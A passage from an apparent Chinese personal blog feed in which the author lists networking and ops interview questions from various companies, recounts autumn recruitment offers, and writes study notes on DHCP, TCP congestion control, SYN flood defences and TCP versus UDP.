干啥的，有啥功能，咋做负载分担<br>\n我说服务器集群，他说还得有数据库集群和其他集群</p>\n<p>怎么样通过域名访问服务器<br>\n我说内网搭个 dns，他说这样只有内网，我又说买个域名设置 ip 解析，他没说啥</p>\n<p>防火墙在出口，怎么保证可靠，还有上网行为管理可靠</p>\n<p>网关在核心，vlan 怎么划分</p>\n<p>上网行为管理放哪，哪种模式</p>\n</blockquote>\n<h2 id=\"16迪普-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#16迪普-技术支持-一面\">#</a> 16. 迪普 - 技术支持 - 一面</h2>\n<blockquote>\n<p>IPSEC 了解过吗</p>\n<p>三层转发源目 IP 源目 MAC 变吗</p>\n<p>BGP 邻居建立</p>\n<p>BGP 传递路由，撤销路由</p>\n<p>bgp refresh import export</p>\n<p>ospf 卡在 exstart 状态原因</p>\n<p>ospf 影响邻居建立因素</p>\n<p>p2mp 和 p2p 能建邻居吗</p>\n<p>linux 压缩解压缩</p>\n<p>tar 命令每个参数含义</p>\n<p>tar 能解压 xxx 吗</p>\n<p>scp 了解过吗</p>\n<p>防火墙转发机制</p>\n<p>防火墙有哪些安全域，dmz 优先级多少</p>\n<p>防火墙区域内互访通吗，区域间呢</p>\n<p>防火墙对于多通道协议支持</p>\n<p>防火墙多通道协议对于 nat 支持</p>\n<p>sql 注入原因与防御</p>\n<p>上网行为管理不通怎么排查 查日志</p>\n<p>割接失败怎么办</p>\n<p>你怎么割接的</p>\n<p>你的优势是什么</p>\n</blockquote>\n<h2 id=\"17腾讯云智-技术运营-一面\"><a class=\"markdownIt-Anchor\" href=\"#17腾讯云智-技术运营-一面\">#</a> 17. 腾讯云智 - 技术运营 - 一面</h2>\n<blockquote>\n<p>两台设备中间经过防火墙，ping 丢包，排错思路</p>\n<p>ospf 常见 lsa</p>\n<p>python 列表去重</p>\n<p>bgp 防环</p>\n<p>云计算了解，云网络了解</p>\n<p>项目具体说说</p>\n<p>linux 你都干啥</p>\n<p>python 你常用哪些库</p>\n<p>python 控制网络设备</p>\n<p>举例深入讲讲看路由交换和防火墙</p>\n<p>aws 定制交换机服务器和商用有啥区别</p>\n<p>aws 部署和退役详细说说</p>\n<p>vps 理解</p>\n</blockquote>\n<h2 id=\"18品高-运维工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#18品高-运维工程师-一面\">#</a> 18. 品高 - 运维工程师 - 一面</h2>\n<blockquote>\n<p>linux 查看内核版本</p>\n<p>查看 cpu 内存磁盘</p>\n<p>mac 和 ip 关系</p>\n<p>路由器转发原理</p>\n<p>linxu 可以做路由器吗</p>\n<p>三层交换机和二层交换机区别</p>\n<p>正向代理反向代理</p>\n<p>实习</p>\n</blockquote>\n<h2 id=\"19腾讯云智-技术运营-二面\"><a class=\"markdownIt-Anchor\" href=\"#19腾讯云智-技术运营-二面\">#</a> 19. 腾讯云智 - 技术运营 - 二面</h2>\n<blockquote>\n<p>项目</p>\n<p>怎么网路隔离</p>\n<p>ts 过程还有什么能优化的</p>\n<p>项目问了我 24 分钟</p>\n<p>MSL 是干啥的，默认数值多少，抓包的时候啥情况能看到</p>\n<p>tcp 四次挥手状态机说说看</p>\n<p>tcp 第一次挥手的重传计时器怎么修改</p>\n<p>上一题不会我脑残和他扯四个包丢了咋办，第三次重传和第四次重传有啥区别</p>\n<p>shell 有几种循环方式</p>\n<p>bgp 防环</p>\n<p>联盟和 RR 咋防环</p>\n<p>IP，TCP，UDP 报文长度</p>\n<p>为啥 IP 一定要四字节的倍数</p>\n<p>linux 有几种查看 cpu 使用率方式</p>\n<p>查看内存 cpu 磁盘进程</p>\n<p>ps ef 能看进程，咋看进程的文件是哪个</p>\n<p>overlay 和 underlay 有啥区别</p>\n<p>还有好多和 tcp 相关的垃圾问题，他直接给老子问道 linux 内核</p>\n<p>一共 40 分钟</p>\n</blockquote>\n<h2 id=\"20腾讯云智-技术运营-三面\"><a class=\"markdownIt-Anchor\" href=\"#20腾讯云智-技术运营-三面\">#</a> 20. 腾讯云智 - 技术运营 - 三面</h2>\n<blockquote>\n<p>有两家运营商电信和联通，电信的流量大，联通的少，怎么把电信的流量扔一些给联通</p>\n<p>timewait 前一个状态是啥，timewait 是干啥的，时间多少，整个状态机说说</p>\n<p>收到两个 fin 包会怎么样</p>\n<p>两台服务器一台二层交换机通信，交换机学习啥表象，服务器学习啥表象</p>\n<p>arp 欺骗怎么解决</p>\n<p>找一个你实习网络相关的问题详细说说</p>\n<p>不同模块区别，10km 和 80km 的模块叫啥</p>\n</blockquote>\n<h2 id=\"21缔安科技-网络工程师-一面\"><a class=\"markdownIt-Anchor\" href=\"#21缔安科技-网络工程师-一面\">#</a> 21. 缔安科技 - 网络工程师 - 一面</h2>\n<blockquote>\n<p>MPLS VPN RT 和 RD</p>\n<p>MPLS VPN 怎么区分私网路由</p>\n<p>BGP 水平分割</p>\n<p>BGP MED 和 localPreference 属性区别</p>\n</blockquote>\n<h2 id=\"22凯鑫科技-技术支持-一面\"><a class=\"markdownIt-Anchor\" href=\"#22凯鑫科技-技术支持-一面\">#</a> 22. 凯鑫科技 - 技术支持 - 一面</h2>\n<blockquote>\n<p>(下面全是实操题)</p>\n<p>使用 lvm 给 root 扩容 10g</p>\n<p>awk 过滤文件名，比如文件名为 1-2-121212-haha，取出 121212 字段</p>\n<p>docker 运行 Nginx</p>\n<p>过滤 top 中使用内存最高的进程</p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/",
            "url": "http://example.com/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/",
            "title": "秋招总结",
            "date_published": "2022-10-27T05:38:45.000Z",
            "content_html": "<h1 id=\"秋招总结\"><a class=\"markdownIt-Anchor\" href=\"#秋招总结\">#</a> 秋招总结</h1>\n<h2 id=\"0x00-废话~\"><a class=\"markdownIt-Anchor\" href=\"#0x00-废话~\">#</a> 0x00 废话～</h2>\n<p>秋招从七月份投的第一家特斯拉开始，到目前 (2022.10.15)，已经投了快 170 家了，有安全，网络，运维岗，我只能投这三个岗，因为我也只会这三个。我常因为自己太菜与你们格格不入～。目前 offer 有四家。</p>\n<blockquote>\n<p>我先叠个 buff，下面说的除了技术纯熟虚构，不要对号入座，<strong>要是真想展开聊聊可以到主页上找有一篇文章有我的 qq</strong></p>\n<p>1. 信锐 (技术支持)</p>\n<p>通过三面拿到的 offer，一面基本技术面，二面半技术半问答 (文章接下来的问答指的均是聊天，比如有女朋友吗，对技服了解吗这类非技术相关的问题)，三面纯问答聊天。最终想薪资也是目前到现在最高的，年薪可以达到 20，因为他在官网写了 20 起步，我就不打码了</p>\n<p>2. 兴唐通信 (系统集成)</p>\n<p>这是一家国企，带有一些保密性质，因此入职三年之内不能离职，这可能是我最不能接受的点，因为子曾经曰过:“安全人，安全魂，安全人都是人上人”，我的计划是今年经济形势不好先随便找个给的多的企业苟着，来年再战，混到安全去！因此我拒绝了这家的 offer。第二个原因就是给的是在有点少，虽然 base 在上海，我立即推当场回家，但上海不到 xxW (具体多少也不能透露，反正没有 xxW，大概 xxk<sub>)，着实有些难受，而且他的风评也有些诡异，告辞，惹不起</sub>。补充一句，这家也有三面，好像三面都没怎么问技术</p>\n<p>3. 中海达 (技术支持)</p>\n<p>这是一家鸽王<sub>，第一批面试的时候鸽了我 20 分钟，当时还在实习，是在是等不起，于是到了第二批。第二批又鸽了我二十分钟，上午的面试，中午才给我打电话，说改到下午五点，五点又迟到 8 分钟</sub>大无语事件。但那天一面面完第二天还是第三天直接发 offer 了。offer 上面没写薪资没写待遇福利，实在难以下咽，遂告辞。更新 1.0:offer 是九月底发的，但十月中旬突然又来和我探讨薪资的事，您这个跨度有些大啊～，而且给的和兴唐差不多，难顶 (薪资水平 xk-xk 左右)</p>\n<p>4. 保融科技 (技术支持)</p>\n<p>这家公司只有二面，两次面试都没咋问技术，但聊得很开心，是秋招目前为止聊得最开心的公司，一面的小姐姐也很好看<sub>好评</sub>，但无奈薪资问题和预期差距过大，毕竟第一个信锐 offer 拿到后，后面面的给的都没信锐多，厂商规模也没信锐大，这家 base 在杭州，但我的 offer 是实施，就是全国出差的那种，那其实和信锐没啥区别了，两家做的东西都相同的情况下，肯定是找大厂和工资高的，保融啊<sub>我对不起你啊</sub> (2,3,4 这三家其实薪资都差不多)(记一下吧反正不发出去，这个基本薪资 x500，也有烂七八糟的补贴)<br>\n 10.20 补充</p>\n<p>今天又拿了两家 offer，再来废话两句</p>\n<p>5. 宏杉科技 (技术支持)</p>\n<p>这是个存储的公司，在全国大部分城市都有办事处，工作地点也和信锐一样，结合自己的意愿和公司实际情况分配。这家是目前为止除了信锐给的第一多的，一个月基本工资能有 xxk，还有乱七八糟的房补，和其他补贴。但他不讲武德的地方在于，如果你把它违约了你需要支付违约金，但如果你因为他把别人违约了他是一分不给。(学学信锐，哪有这么白嫖的)，而且常住地，户籍所在地是没有房补的。没有必要，拒了。面试一共两次，第一次问了点技术，第二次也问了点，但比第一次少很多，第二次多了很多职场题目。</p>\n<p>6. 东方日升 (运维工程师)</p>\n<p>这家应该是做经济的，我投的好像是啥技术类管培生，他的 offer 上是这么写的，我也不记得我投了啥了。这家一共只有一面，是 hr 和一个问技术的一起面的，但技术没问啥，全问的项目实习，这种回答了几千遍的题目是在没意思，我全程输出，他根本插不上嘴，我一堆 span-leaf，border-leaf 把它杀穿。然后第二天就给 offer 了，问题在于实习 x000，转正 x800。难顶啊～拒了拒了</p>\n<p>10.21 补充，又拿了一家 offer 再来 bb 两句 ，说实话，每次拿到 offer 都把我搞的精疲力尽</p>\n<p>7. 中科闻歌 (运维工程师)</p>\n<p>这家是面到现在最心动的一家公司，面试只有一面，但三个面试官，第一个问网络，第二个问项目，第三个 hr 随便问点，但他们给人一种很重视应届毕业生的感觉，也可能是错觉，而且这家公司规模其实能比信锐更大一些，我投的是做运维的，据他们说他们公司会让网络和搞云计算的一起工作，达成一些目的。但无奈薪资实在尴尬，北京 xw，没有房补，我真的要露宿街头了，当场贷款上班，告辞，最不巧的是给信锐寄方法和给中科翁工决定是同一天的同一个下午，但凡他有个房补，我当场违约。</p>\n<p>10.25 补充，这是昨天还是前天的 offer 了</p>\n<p>8. 石化盈科 (网络安全工程师)</p>\n<p>非常奇葩的面试，只有一面，但一面包车的面试官，一个腾讯会议进去十几个人，每个人都应该是部门的经理一类的，然后 hr 是先和你进行讨论的人，讲到哪个技术部门负责人感兴趣会对你进行追问，比如当时有个部门应该是搞渗透测试的，还有个应该是搞二进制的。这个 offer 也很奇葩，hr 告诉部门经理 offer 已经给我了，让他来找我沟通，结果我没有收到 offer，听这个人一顿讲，最后不知道薪资多少。最后还是他帮我问的，一个月 xk+，还是包含房补的，工作地点在北六环附近，那边租房也得 2k-3k，抢钱啊～，但听那人最后的意思是找我去做数据中心运维…</p>\n<p>10.29 补充</p>\n<p>9. 上海汉得信息 (云解决方案工程师)</p>\n<p>这个虽然名字很高级，什么云方案，但其实就是运维 + 技术支持，在上海总部，这是他比信锐唯一好的一点，薪资的话 ([xk-xk]+ 房补)，有培训期，2-3weeks，有实习期，你拿到毕业证之前都算实习期，还有试用期，6 months，最后才是转正，每一级都会比上一级至少少 80%，就是转正之后每天还要为 2k 奋斗，因为如果只拿 xk 容易饭都吃不起，40|80 是项目补贴，每天都有，试用 x，转正 x,x 好像是餐补，房补不会真给你，但他会在公司附近帮你租房，或者住员工宿舍，其实算下来在北京租完房剩的和这差不多了，但我还想等等大厂，毕竟这家。。不是特别有想法。</p>\n<p>11.2 更新</p>\n<p>10. 中科曙光（云平台网络研发工程师）</p>\n<p>这家特别离谱，让我做了三遍测评，说是前两遍没过，hr 甚至还找不部门的人为了给我第三次机会，然鹅，我做完了第三次，他们就不鸟我了，我记得 10.31 看到了中科曙光毁约在牛客上，我 emmmm，结果他们今天又来找我了，还来沟通 offer，xw 年薪，每个月还有 x00 餐补，一天 10 块钱，我喝西北风去吧还有七险两金，说自己是国企性质，呵呵呵，谁都说自己国企性质，国企性质和国企是两码事，别被骗了，我拖了两天，给他和我都留个台阶下，不如意外肯定拒了，他 base 在成都，其实成都这个价还行，但我纠结汉得和信锐，可恶啊，Amazon 不理我，云智也不理我，难顶～</p>\n<p>11.18 更新 之前装逼遭报应了，整整半个月没一个 offer</p>\n<p>11. 迪普科技（技术支持工程师）</p>\n<p>这是一家搞安全的公司，看深信服 hr 朋友圈发的安全厂商里面市值排名第八，还行吧，但他产品线真的广，从网络到无线到安全，他都有。昨天接到的 offer，昨天也把汉得拒了，今天准备违约信锐签迪普，信锐产品线太少了，只有路由器和交换机，而且迪普我以后能搞到安全的概率会更大，但 tm 违约信锐要交 xk，我去 tm 的，之前有个朋友让我去 boss 直聘上面看看，投了十几家，面了几家，得出的结论是 boss 直聘狗都不去，面试官素质极低，面试质量极差，真的无语了，这家待遇 [xx000+(x000-x000)]*(x)</p>\n<p>11.21 补充</p>\n<p>12. 缔安科技（网络工程师）</p>\n<p>这家给的实在太少了，x-1xk，呜呜呜，面试倒还行，一面面了三面的活，一个人问技术，一个人问项目，一个人问情商题，还有一个主持人，技术问的很有趣，秋招到现在第一次有人问 mpls vpn，稀客呀～，项目就那样吧，回答的麻了，重复了上百遍的回答，最后那个情商题我回答的和狗屎一样，同时他也问了对公司的了解，这就要骂人了，你这么小公司，逼乎都搜不到，我去哪了解你，还说我没充分了解，我 g。</p>\n<p>13. 吉祥航空 (通信网络工程师)</p>\n<p>一共一面，两个面试官，一个主持一个问技术，技术问的都是些项目，比如控制出口选路，昨天面得今天发的 offer，但给的太少了，全包 x.8w，告辞，少的离谱</p>\n<p>12.2 补充</p>\n<p>14. 长亭科技 (技术支持)</p>\n<p>长亭好啊，一面 10/6，二面 11.9，三面 11.21，四面 11.25，offer12.2，这个面试过程实在是太长了，中途差点就和迪普签了，但还好有 yq 的因素拖了 dp 很久，等来了长亭，但长亭在上海，给的 x000+x00（餐补）*x-x 我的 offer 的年薪越来越少，人家越拿越多，离大谱，但长亭逼乎上的的评价基本都是正向的，而某些迪普全是差评和喷 hr 的。。。本来打算过完年就去实习，结果西安 zf 发病，非要立马把人全放了，考试下学期考。。。我 tm 下学期要去实习了还要考试？你在想什么啊？？</p>\n<p>15. 石化盈科 (网络安全)</p>\n<p>在北京 x00+x000，这他妈还包含住房补贴，我去北京贷款上班吧，还 x000 违约金，offer 拿多了就会发现越是垃圾的公司违约金越高，长亭就 xk，这某些盈科怎么敢要 xk 的啊，真大无语，告辞，惹不起</p>\n<p>12.6 补充</p>\n<p>16. 嘉兴银行（科技管培生）</p>\n<p>笔试和测评环节超多，已经加起来有五场，后面还有一个 ai 面和两个面试，那两个面试都是群殴类型，你一个打对面五六个，offer 发的很晚，面试流程很长，你忍一下，他 offer 只有一个短信，没有薪资没有其他任何信息，只有让你在五个小时以内回复同意 offer，过期作废，金融企业面子是真大，没回复他们，拒了拒了。看了一下 xxxxxshow 说是 **W (研究生)</p>\n<p>12.20 补充</p>\n<p>17. 腾讯云智 (网络技术类)</p>\n<p>面过程非常非常长，10.28 一面，最后 offer12.20 发的，虽然是从池子里捞出来的。当时面完三面就没结果了，结果 12 月初又给我发面试。在西安，投的时候都叫技术支持，实际在入职时的岗位会变，比如我就变成了网络类，我朋友变成了运维。他第一年给的真的很多，第一年 2* = xx000 + xx000 + xx000 + xx*13 ，但第二年 xx00 白送的没了，xx000 房补也没了，第二年就很拉了，但这是在西安，这个年薪还是非常可观的要是没有更好的或者你们不搞安全可以去。反正因人而异吧，反正我去长亭了告辞，顺便说下，那个 x2000 的年终奖是评级最高档的，dddd</p>\n</blockquote>\n<p>再废话两句，1. 有能投的就投，千万别看大小，举个栗子，谁都没想到今年最高的是个没听过名字的机器人公司，你认为的小厂不一定是小厂，一般有机构看机构的就业群，没有找公众号，公众号的企业虽然多，但不是所有企业都要我这种 IT 的，秋招群里的信息实际上是老师们过滤之后的，有针对性了很多</p>\n<p>2. 笔试和测评可能很多很多，但还是要好好做的，万一呢～</p>\n<p>3. 考研，考研，考研，重要的事情说八百遍，今天面试的哥们问我你有 ie 为啥不去华为，我:…，华为是不会要双非的本科的，考研最好也往 211 考。</p>\n<p>4. 最好对自己投的企业做个详细记录，同时对面试过程也做个详细记录，方便后续复盘，我今天的复盘的全部内容来自于我每次面完写的 CSDN，最好每次面完就复盘，这样对你下一家类似岗位的很有帮助，人不能在一个地方疯狂翻车</p>\n<p>5. 不要死磕运维 / 安全岗，有给的多的，差不多能干的就先跑，不雅等春招，某个企业的 HR 在和我聊得时候透露等春招他们就剩个位数岗位或者直接不招了，而且春招还要再加几百万研究生们，难度直接上天</p>\n<p>总结到这，废话说完了，开始正题，预计文章会有两大部分。 <code>1.网络岗，技术支持岗，运维岗面试总结</code>     <code>2.安全岗面试总结</code></p>\n<p>项目实习啥的就不说了问的基本上都一样，还有一些你遇到的困难，印象深刻的事啦，随缘临场发挥吧</p>\n<p>安全岗包括但不限于安服，网络安全管培生等职位，和安全相关的都在下面列举</p>\n<h2 id=\"0x01-网络技术支持运维岗总结\"><a class=\"markdownIt-Anchor\" href=\"#0x01-网络技术支持运维岗总结\">#</a> 0x01 网络，技术支持，运维岗总结</h2>\n<h3 id=\"1dhcp工作原理报文种类\"><a class=\"markdownIt-Anchor\" href=\"#1dhcp工作原理报文种类\">#</a> 1.DHCP 工作原理，报文种类</h3>\n<p><code>出现厂家：特斯拉一面(ip helper address)，信锐(获取地址方法，问的其实还是这个)，中科曙光，宏杉</code></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016184839806.png\" alt=\"image-20221016184839806\" style=\"zoom: 67%;\" />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.四次交互获取IP</span><br><span class=\"line\">广播发送discover报文，寻找DHCP服务器</span><br><span class=\"line\">offer单播回，其中包含着一个ip地址和一些配置信息比如，网关，租期，dns等</span><br><span class=\"line\">广播发送request请求这个IP地址，发广播的原因可能网络中还有其他的DHCP服务器，告诉他们自己有了IP地址</span><br><span class=\"line\">dhcp服务器收到a的request之后单播发送一个ACK,此地址才可以开始使用</span><br><span class=\"line\"></span><br><span class=\"line\">2.租期，续约</span><br><span class=\"line\">当租期到达50%会单播发送request包，服务器收到单播回复ack，主机租期刷新</span><br><span class=\"line\">在租期到达85%会广播发送request包，网络上任何一台DHCP服务器都可以应答ack或者nak，收到ACK刷新租期，收到NAK重新申请IP</span><br><span class=\"line\">当租期到达100%会发送release报文，释放IP地址，之后重新discover申请地址</span><br><span class=\"line\">即可以通过request刷新租期，release释放地址</span><br><span class=\"line\"></span><br><span class=\"line\">3.DHCP是UDP的，使用67(server),68(client)</span><br><span class=\"line\"></span><br><span class=\"line\">4.dhcp一共八种报文，剩下四种</span><br><span class=\"line\">NAK：服务器拒绝请求</span><br><span class=\"line\">release：释放IP地址</span><br><span class=\"line\">infrom：向服务端请求一些信息</span><br><span class=\"line\">decline：地址冲突时，告知服务器禁止使用此地址</span><br><span class=\"line\"></span><br><span class=\"line\">5.一些协议细节~</span><br><span class=\"line\">1.如果该客户端上次也问服务端要过地址，那么客户端在检查该地址没有被分配有还是会分配给这个客户端(所以说dhcp是C/S的)</span><br><span class=\"line\">2.客户端发的discover含有request ip，服务端检查地址是否可用，如果可用，还是会分给客户端此地址</span><br><span class=\"line\">3.客户端发的discover不含request ip，服务端从地址池上找一个最小的可用IP分配</span><br><span class=\"line\">4.NAK的情况：请求的静态IP，MAC无法与之对应。ack中验证失败</span><br><span class=\"line\"></span><br><span class=\"line\">6.DHCP offer中有租期是华为特有,其他厂商是使用inform报文</span><br><span class=\"line\">最好看看不同厂商对于DHCP的支持</span><br></pre></td></tr></table></figure>\n<h4 id=\"dhcp中继云智\"><a class=\"markdownIt-Anchor\" href=\"#dhcp中继云智\">#</a> dhcp 中继 (云智)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DHCP中继，其实就是在与DHCP Server不同而又需要申请DHCP服务的网络内，设置一个中继器，中继器在该网络中代替DHCP Server服务器接收DHCP Client的请求，并将DHCP Client发给DHCP Server的DCHP报文，以单播的形式发送给DHCP Server。DHCP Server在收到由DHCP发送来的DHCP 报文后，同样会把响应的DHCP报文发送给DHCP 中继。这样，DHCP其实是充当了一个中间人的作用，起到了在不同的网络中运行DHCP的目的。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"3tcpudp相关\"><a class=\"markdownIt-Anchor\" href=\"#3tcpudp相关\">#</a> 3.TCP/UDP 相关</h3>\n<h4 id=\"tcp滑动窗口初始值慢启动流控快手\"><a class=\"markdownIt-Anchor\" href=\"#tcp滑动窗口初始值慢启动流控快手\">#</a> tcp 滑动窗口初始值，慢启动，流控 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">滑动窗口</span><br><span class=\"line\">TCP连接每一方的接收缓冲空间大小都固定，接收端只允许另一端发送接收端缓冲区所能接纳的数据，TCP在滑动窗口的基础上提供流量控制，防止较快主机致使较慢主机的缓冲区溢出；TCP也是一样的，除了入口有发送方滑动窗口，出口处也设立有接收方滑动窗口。</span><br><span class=\"line\">拥塞控制</span><br><span class=\"line\">防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。</span><br><span class=\"line\">拥塞控制避免</span><br><span class=\"line\">慢开始( slow-start )、拥塞避免( congestion avoidance )、快重传( fast retransmit )和快恢复( fast recovery )。</span><br><span class=\"line\">发送方维持一个拥塞窗口 cwnd ( congestion window )的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送方让自己的发送窗口等于拥塞。</span><br><span class=\"line\">发送方控制拥塞窗口的原则是：只要网络没有出现拥塞，拥塞窗口就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入到网络中的分组数。</span><br><span class=\"line\">慢开始算法：当主机开始发送数据时，如果立即所大量数据字节注入到网络，那么就有可能引起网络拥塞，因为现在并不清楚网络的负荷情况。因此，较好的方法是 先探测一下，即由小到大逐渐增大发送窗口，也就是说，由小到大逐渐增大拥塞窗口数值。通常在刚刚开始发送报文段时，先把拥塞窗口 cwnd 设置为一个最大报文段MSS的数值。而在每收到一个对新的报文段的确认后，把拥塞窗口增加至多一个MSS的数值。用这样的方法逐步增大发送方的拥塞窗口 cwnd ，可以使分组注入到网络的速率更加合理。</span><br><span class=\"line\">...自己看吧，我也不知道这啥玩意</span><br><span class=\"line\">https://blog.csdn.net/qq_41431406/article/details/97926927</span><br><span class=\"line\">https://blog.csdn.net/ligupeng7929/article/details/79597423</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp-syn-flood-防御快手\"><a class=\"markdownIt-Anchor\" href=\"#tcp-syn-flood-防御快手\">#</a> TCP syn flood 防御 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用TCP三次握手协议，大量与服务器建立半连接，服务器默认需要重试5次，耗时63s才会断开接，这样，攻击者就可以把服务器的syn连接队列耗尽，让正常的连接请求不能处理。</span><br><span class=\"line\">最直接的做法就是提高服务能力，比如组建集群，升级硬件。</span><br><span class=\"line\">对于防火墙这类安全设备而言，SYN报文是正常的业务报文，防火墙的安全策略必须允许其通过，否则服务器就无法对外提供服务。</span><br><span class=\"line\">如果能明确虚假源的IP地址，就能通过精细的安全策略阻止这些源发来的SYN报文。</span><br><span class=\"line\">此时需要anti-DDoS。Anti-DDoS系统处理SYN报文主要有两种手段，源认证和首包丢弃。</span><br><span class=\"line\">Anti-DDoS系统拦截客户端发送的SYN报文，代替服务器向客户端发送SYN-ACK报文，如果客户端不应答，则认为该客户端为虚假源；如果客户端应答，则Anti-DDoS系统认为该客户端为真实源，并将其IP地址加入白名单，在一段时间允许该源发送的所有SYN报文通过，也不做代答。</span><br><span class=\"line\">如果Anti-DDoS系统代替服务器应答了所有的SYN Flood攻击报文，那么性能瓶颈仅仅是从服务器转移到了Anti-DDoS系统而已。一旦Anti-DDoS系统的系统资源耗尽，攻击依旧会透传到服务器，而且大量反弹的SYN-ACK报文也会对网络造成一定的压力。Anti-DDoS系统利用首包丢弃来解决这个问题。</span><br><span class=\"line\">TCP协议的可靠性不仅体现在三次握手，还体现在超时与重传的机制。正常情况下客户端发送SYN报文后如果在一定时间没有收到服务器的SYN-ACK应答，客户端会重新发送SYN报文。Anti-DDoS系统会丢弃掉收到的第一个SYN报文。SYN Flood攻击时，黑客发送的绝大多数是变源的SYN报文，所有的SYN报文对于Anti-DDoS系统来说都是首包，都将被直接丢弃。如果客户端重传了SYN报文，Anti-DDoS系统再对该报文进行源认证。如此一来，大大减少了Anti-DDoS系统代答的压力。首包丢弃和源认证两种手段结合，对于防御SYN Flood（特别是不断变换源IP和源端口的虚假源攻击）非常有效。</span><br><span class=\"line\">hping3</span><br><span class=\"line\">hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。</span><br><span class=\"line\">增大tcp_max_syn_backlog   增大队列用来存放还没有确认ACK的客户端请求</span><br><span class=\"line\">减小tcp_synack_retries    减少服务端重发ack的次数</span><br><span class=\"line\">启用tcp_syncookies\t\t当启用tcp_syncookies时，backlog满了后，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列backlog里（即没有存储任何关于这个连接的信息，不浪费内存）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。</span><br><span class=\"line\"></span><br><span class=\"line\">过滤</span><br><span class=\"line\">增加积压</span><br><span class=\"line\">减少SYN-RECEIVED定时</span><br><span class=\"line\">复用古老的半开通TCP</span><br><span class=\"line\">SYN缓存</span><br><span class=\"line\">SYN Cookie</span><br><span class=\"line\">混合方法</span><br><span class=\"line\">防火墙和代理</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp和udp区别茄子汉得\"><a class=\"markdownIt-Anchor\" href=\"#tcp和udp区别茄子汉得\">#</a> tcp 和 UDP 区别 (茄子，汉得)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议</span><br><span class=\"line\">UDP（User Data Protocol）是一个非连接的协议，传输数据之前源端和终端不建立连接</span><br><span class=\"line\"></span><br><span class=\"line\">2.UDP和TCP报头长度</span><br><span class=\"line\">UDP 8字节</span><br><span class=\"line\">TCP 20字节</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br><span class=\"line\">UDP面向报文，尽力而为，没有拥塞控制等算法</span><br><span class=\"line\">TCP可靠，有差错校验，滑动窗口，流控，面向字节流</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br><span class=\"line\">TCP只能点到点全双工，UDP支持一对一，一对多，多对一</span><br><span class=\"line\"></span><br><span class=\"line\">5.</span><br><span class=\"line\">TCP要求的系统资源较多，UDP较少</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp四次挥手timewait作用长亭\"><a class=\"markdownIt-Anchor\" href=\"#tcp四次挥手timewait作用长亭\">#</a> tcp 四次挥手 timewait 作用 (长亭)</h4>\n<p><img 